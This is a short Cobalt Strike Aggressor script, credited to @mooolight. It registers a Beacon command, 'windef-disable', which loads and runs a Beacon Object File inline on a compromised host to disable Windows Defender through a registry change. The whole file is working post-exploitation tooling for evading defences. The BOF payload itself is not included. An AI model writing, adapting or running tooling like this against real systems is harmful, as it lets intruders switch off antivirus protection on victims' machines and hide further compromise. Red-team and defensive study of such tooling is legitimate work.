# author @mooolight

beacon_command_register(
	"windef-disable", "Disabling Windows Defender via Registry modification.",
	"INFO:\nDisabling Windows Defender via Registry modification.\n\n" .
	"ARGUMENTS:\nNone.\n\n\n" .
	"USAGE:\nwindef-disable\n\n".
	"EXAMPLES:\nwindef-disable\n\n");

alias windef-disable {
    $bid = $1;
	
    # Read in the right BOF file
    $handle = openf(script_resource("windef-disable-bof.o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack our arguments
    $arg_data  = bof_pack($bid, "");

    blog($bid, "Disabling Windows Defender via Registry modification..");
    beacon_inline_execute($bid, $data, "go", $arg_data);
}